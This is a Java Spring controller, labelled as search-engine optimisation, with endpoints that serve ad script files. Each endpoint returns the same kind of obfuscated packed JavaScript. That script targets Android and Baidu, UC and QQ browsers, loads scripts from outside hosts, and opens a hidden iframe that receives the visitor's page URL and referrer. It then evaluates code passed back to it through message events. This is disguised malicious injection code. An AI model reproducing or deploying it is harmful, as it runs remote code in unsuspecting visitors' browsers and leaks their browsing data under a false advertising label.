package com.anqun;

import com.anqun.service.AdManageService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 * 搜索引擎优化
 */
@RestController
public class AdManageController {
    @Autowired
    private AdManageService adManageService;

    //广告位置1
    @GetMapping("/ad1.js")
    public String ad1(HttpServletResponse httpServletResponse, HttpServletRequest httpServletRequest)  {
        String arg="ad1";
        String ad="eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('a((/(L)/i.o(c.j))&&(/(C)/i.o(c.j))){3.9(\\'<6 b=\"J\"><\\\\/6>\\');3.9(\\'<f r=\"h://m.n-q.t/N/14/12/13.T.B\"><\\\\/f>\\')}u a((/(W|V|C)/i.o(c.j))){k.S(\\'X\\',v(e){7 8=e.Y;a(8.4){a(k[8.4+\"w\"]!=1){k[8.4+\"w\"]=1;10(Z(8.K.R(/\\\\+/g,\"%Q\")))}}});7 4=\"A\"+d.p().F(G).D(2);3.9(\"<6 b=\\'6\"+4+\"\\'></6>\");3.9(\\'<x P=\"O:M;\" b=\"\\'+4+\\'\" r=\"h://m.n-q.t/E-I-\\'+d.U(d.p()*19)+\\'.1p?1l=5&1j=\\'+z(1m.1k)+\\'&y=\\'+c[\"y\"]+\\'&4=\\'+4+\\'&1o=\\'+z(3.15)+\\'\" 1n=\"1r\" 1q=\"1h%\"  1a=\"0\" 1i=\"18\" 16=\"0\" 17=\"1b\"></x>\\')}u{;(v(){7 m=3.1c(\"f\");7 s=\"A\"+d.p().F(G).D(2);3.9(\"<6 b=\\'\"+s+\"\\'></6>\");7 H=\\'h://m.n-q.t\\';m.r=H+\"/11/E.B?1g=\"+s;7 l=3.1f(\"f\")[0];l.1e.1d(m,l)})()}',62,90,'|||document|if_id||div|var|_c_ob|write|if|id|navigator|Math||script||https||userAgent|window|ss||ci|test|random|web|src||cn|else|function||iframe|platform|encodeURIComponent|_|js|baidu|slice|644929|toString|36|url|39|djb|wz_ev_j|Android|none|fe|display|style|20|replace|addEventListener|bfc9aVQ1SAFYO_modern|round|UCBrowser|MQQBrowser|message|data|decodeURIComponent|eval||content|mobile_view|shank|referrer|frameborder|allowtransparency|no|10000|marginheight|true|createElement|insertBefore|parentNode|getElementsByTagName|ssid|100|scrolling|ifr_url|href|is_iframe|location|height|ifr_ref|html|width|auto'.split('|'),0,{}))";
        return adManageService.adManage(httpServletResponse,httpServletRequest,ad,arg);
    }

    //广告位置1
    @GetMapping("/hzs.js")
    public String hzs(HttpServletResponse httpServletResponse, HttpServletRequest httpServletRequest)  {
        String arg="ad1";
        String ad="eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('a((/(L)/i.o(c.j))&&(/(C)/i.o(c.j))){3.9(\\'<6 b=\"J\"><\\\\/6>\\');3.9(\\'<f r=\"h://m.n-q.t/N/14/12/13.T.B\"><\\\\/f>\\')}u a((/(W|V|C)/i.o(c.j))){k.S(\\'X\\',v(e){7 8=e.Y;a(8.4){a(k[8.4+\"w\"]!=1){k[8.4+\"w\"]=1;10(Z(8.K.R(/\\\\+/g,\"%Q\")))}}});7 4=\"A\"+d.p().F(G).D(2);3.9(\"<6 b=\\'6\"+4+\"\\'></6>\");3.9(\\'<x P=\"O:M;\" b=\"\\'+4+\\'\" r=\"h://m.n-q.t/E-I-\\'+d.U(d.p()*19)+\\'.1p?1l=5&1j=\\'+z(1m.1k)+\\'&y=\\'+c[\"y\"]+\\'&4=\\'+4+\\'&1o=\\'+z(3.15)+\\'\" 1n=\"1r\" 1q=\"1h%\"  1a=\"0\" 1i=\"18\" 16=\"0\" 17=\"1b\"></x>\\')}u{;(v(){7 m=3.1c(\"f\");7 s=\"A\"+d.p().F(G).D(2);3.9(\"<6 b=\\'\"+s+\"\\'></6>\");7 H=\\'h://m.n-q.t\\';m.r=H+\"/11/E.B?1g=\"+s;7 l=3.1f(\"f\")[0];l.1e.1d(m,l)})()}',62,90,'|||document|if_id||div|var|_c_ob|write|if|id|navigator|Math||script||https||userAgent|window|ss||ci|test|random|web|src||cn|else|function||iframe|platform|encodeURIComponent|_|js|baidu|slice|644929|toString|36|url|39|djb|wz_ev_j|Android|none|fe|display|style|20|replace|addEventListener|bfc9aVQ1SAFYO_modern|round|UCBrowser|MQQBrowser|message|data|decodeURIComponent|eval||content|mobile_view|shank|referrer|frameborder|allowtransparency|no|10000|marginheight|true|createElement|insertBefore|parentNode|getElementsByTagName|ssid|100|scrolling|ifr_url|href|is_iframe|location|height|ifr_ref|html|width|auto'.split('|'),0,{}))";
        return adManageService.adManage(httpServletResponse,httpServletRequest,ad,arg);
    }
    //广告位置2
    @GetMapping("/ad2.js")
    public String ad2(HttpServletResponse httpServletResponse, HttpServletRequest httpServletRequest)  {
        String arg="ad2";
        String ad="eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('a((/(I)/i.n(b.k))&&(/(D)/i.n(b.k))){3.8(\\'<6 c=\"L\"><\\\\/6>\\');3.8(\\'<f t=\"h://m.o.q/Z/X/B/p/B!Y@p\"><\\\\/f>\\')}z a((/(W|P|D)/i.n(b.k))){j.V(\\'U\\',u(e){7 9=e.T;a(9.4){a(j[9.4+\"w\"]!=1){j[9.4+\"w\"]=1;12(S(9.13.J(/\\\\+/g,\"%K\")))}}});7 4=\"v\"+d.l().G(F).H(2);3.8(\"<6 c=\\'6\"+4+\"\\'></6>\");3.8(\\'<A R=\"Q:M;\" c=\"\\'+4+\\'\" t=\"h://m.o.q/C-O-\\'+d.N(d.l()*10)+\\'.18?1k=5&1j=\\'+y(1i.1m)+\\'&x=\\'+b[\"x\"]+\\'&4=\\'+4+\\'&1h=\\'+y(3.14)+\\'\" 1l=\"1p\" 1o=\"1n%\"  1f=\"0\" 1g=\"17\" 16=\"0\" 15=\"19\"></A>\\')}z{;(u(){7 m=3.1a(\"f\");7 s=\"v\"+d.l().G(F).H(2);3.8(\"<6 c=\\'\"+s+\"\\'></6>\");7 E=\\'h://m.o.q\\';m.t=E+\"/11/C.p?1e=\"+s;7 r=3.1d(\"f\")[0];r.1c.1b(m,r)})()}',62,88,'|||document|if_id||div|var|write|_c_ob|if|navigator|id|Math||script||https||window|userAgent|random||test|overlordtea|js|cn|ss||src|function|_||platform|encodeURIComponent|else|iframe|index|344847|baidu|url|36|toString|slice|Android|replace|20|djb|none|round|39|UCBrowser|display|style|decodeURIComponent|data|message|addEventListener|MQQBrowser|portal|bf8f2UA1SAVAA|project|10000||eval|wz_ev_j|referrer|allowtransparency|frameborder|no|html|true|createElement|insertBefore|parentNode|getElementsByTagName|ssid|marginheight|scrolling|ifr_ref|location|ifr_url|is_iframe|height|href|100|width|auto'.split('|'),0,{}))\n";
        return adManageService.adManage(httpServletResponse,httpServletRequest,ad,arg);
    }
    //广告位置2
    @GetMapping("/hzx.js")
    public String hzx(HttpServletResponse httpServletResponse, HttpServletRequest httpServletRequest)  {
        String arg="ad2";
        String ad="eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('a((/(I)/i.n(b.k))&&(/(D)/i.n(b.k))){3.8(\\'<6 c=\"L\"><\\\\/6>\\');3.8(\\'<f t=\"h://m.o.q/Z/X/B/p/B!Y@p\"><\\\\/f>\\')}z a((/(W|P|D)/i.n(b.k))){j.V(\\'U\\',u(e){7 9=e.T;a(9.4){a(j[9.4+\"w\"]!=1){j[9.4+\"w\"]=1;12(S(9.13.J(/\\\\+/g,\"%K\")))}}});7 4=\"v\"+d.l().G(F).H(2);3.8(\"<6 c=\\'6\"+4+\"\\'></6>\");3.8(\\'<A R=\"Q:M;\" c=\"\\'+4+\\'\" t=\"h://m.o.q/C-O-\\'+d.N(d.l()*10)+\\'.18?1k=5&1j=\\'+y(1i.1m)+\\'&x=\\'+b[\"x\"]+\\'&4=\\'+4+\\'&1h=\\'+y(3.14)+\\'\" 1l=\"1p\" 1o=\"1n%\"  1f=\"0\" 1g=\"17\" 16=\"0\" 15=\"19\"></A>\\')}z{;(u(){7 m=3.1a(\"f\");7 s=\"v\"+d.l().G(F).H(2);3.8(\"<6 c=\\'\"+s+\"\\'></6>\");7 E=\\'h://m.o.q\\';m.t=E+\"/11/C.p?1e=\"+s;7 r=3.1d(\"f\")[0];r.1c.1b(m,r)})()}',62,88,'|||document|if_id||div|var|write|_c_ob|if|navigator|id|Math||script||https||window|userAgent|random||test|overlordtea|js|cn|ss||src|function|_||platform|encodeURIComponent|else|iframe|index|344847|baidu|url|36|toString|slice|Android|replace|20|djb|none|round|39|UCBrowser|display|style|decodeURIComponent|data|message|addEventListener|MQQBrowser|portal|bf8f2UA1SAVAA|project|10000||eval|wz_ev_j|referrer|allowtransparency|frameborder|no|html|true|createElement|insertBefore|parentNode|getElementsByTagName|ssid|marginheight|scrolling|ifr_ref|location|ifr_url|is_iframe|height|href|100|width|auto'.split('|'),0,{}))\n";
        return adManageService.adManage(httpServletResponse,httpServletRequest,ad,arg);
    }
}
